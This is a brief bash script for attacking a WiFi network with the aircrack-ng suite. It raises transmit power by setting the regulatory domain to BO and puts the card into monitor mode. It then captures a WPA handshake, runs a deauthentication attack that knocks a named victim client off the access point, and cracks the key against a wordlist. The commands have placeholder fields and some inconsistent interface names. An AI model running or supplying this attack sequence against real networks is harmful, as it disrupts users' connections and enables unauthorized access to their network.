#!/bin/bash
wordlist=/installs/apps/wordlists/10000.txt
cap_file=./data/packets.cap
txp=30
iface=wlan0

#set
ifconfig wlan0 down
iw reg set BO
iwconfig wlan0 txpower $txp
ifconfig wlan0 up

airmon-ng start wlan0 6
airodump-ng -c 6 –bssid (AP MAC) -w (filename) mon0
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}
aircrack-ng -0 -w $wordlist $cap_file
